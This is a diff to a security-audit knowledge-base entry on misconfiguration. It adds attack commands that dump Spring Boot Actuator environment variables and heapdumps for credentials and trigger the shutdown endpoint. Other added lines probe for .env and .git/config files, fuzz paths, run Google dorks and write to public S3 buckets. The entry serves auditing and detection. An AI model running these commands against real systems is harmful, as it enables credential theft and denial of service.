@@ -1,8 +1,8 @@
 # Security Misconfiguration & Default Settings
 
-**Tags:** #high #misconfiguration #debug #cloud #infrastructure
+**Tags:** #high #misconfiguration #debug #cloud #actuator #infrastructure
 **OWASP:** A02:2025 Security Misconfiguration
-**CVSS Base:** 5.0 - 9.8 (Varies heavily depending on what is exposed)
+**CVSS Base:** 5.0 — 9.8 (Critical → if Actuator heapdump or debug mode exposes credentials)
 
 ---
 
@@ -107,23 +107,69 @@ app.use((err, req, res, next) => {
 
 ## 💣 Exploit Techniques
 
-### 1. Spring Boot Actuator Exploitation
-If `/actuator/env` or `/actuator/heapdump` is exposed:
+### 1. Spring Boot Actuator Exploitation (Priority Target)
+If `/actuator` is exposed, the attack surface escalates from info-leak to near-RCE.
+
 ```bash
-curl -s http://target.com/actuator/env | jq
-# Attacker dumps the environment variables, looking for AWS_SECRET_ACCESS_KEY or DB passwords.
+# Phase 1: Enumerate all exposed actuator endpoints
+curl -s http://target.com/actuator | jq '.links'
+
+# Phase 2: Dump environment variables (DB passwords, API keys, cloud credentials)
+curl -s http://target.com/actuator/env | jq '._links | to_entries[] | select(.value.href | contains("env"))'
+# Look for: spring.datasource.password, AWS_SECRET_ACCESS_KEY, JWT_SECRET
+
+# Phase 3: Heap dump - extract secrets from live JVM memory
+curl -o heapdump http://target.com/actuator/heapdump
+# Parse with Eclipse Memory Analyzer (MAT) or:
+strings heapdump | grep -iE "password|secret|token|key" | head -50
+
+# Phase 4: Change log level to TRACE → forces verbose output leaking SQL queries
+curl -X POST http://target.com/actuator/loggers/ROOT \
+  -H 'Content-Type: application/json' \
+  -d '{"configuredLevel": "TRACE"}'
+
+# Phase 5: Shutdown endpoint (DoS if enabled)
+curl -X POST http://target.com/actuator/shutdown
 ```
 
-### 2. Google Dorking for Directory Listings
+**Static Detection:** `grep_search` for `management.endpoints.web.exposure.include=*` or `management.endpoint.shutdown.enabled=true` in `application.properties`.
+
+**False Positive Guard:** If the application is behind authentication middleware that restricts `/actuator/*` to internal network IPs only, severity reduces to Low. Always confirm accessibility first.
+
+### 2. `.env` and Config File Discovery
+```bash
+# Common locations to try during audits
+curl http://target.com/.env
+curl http://target.com/.env.backup
+curl http://target.com/config/database.yml
+curl http://target.com/wp-config.php.bak
+curl http://target.com/.git/config # → git credentials
+
+# Automated wordlist approach
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -e .env,.bak,.backup,.old,.yml,.conf
+```
+
+### 3. Google Dorking for Directory Listings
 ```
 intitle:"index of" "database.yml"
 intitle:"index of" inurl:backup
+intitle:"index of" ".env"
+site:target.com ext:log
+site:target.com ext:sql
 ```
 
-### 3. S3 Bucket Enumeration
+### 4. S3 Bucket Enumeration
 ```bash
+# Direct test (no-sign = anonymous request)
 aws s3 ls s3://company-production-assets --no-sign-request
-# If successful, the bucket is public.
+
+# If writable, insert a canary file
+aws s3 cp test.txt s3://company-bucket/AUDIT_TEST.txt --no-sign-request
+
+# Automated enumeration tools
+grayhatwarfare.com  # passive bucket hunting
+buckets.grayhatwarfare.com
 ```
 
 ---
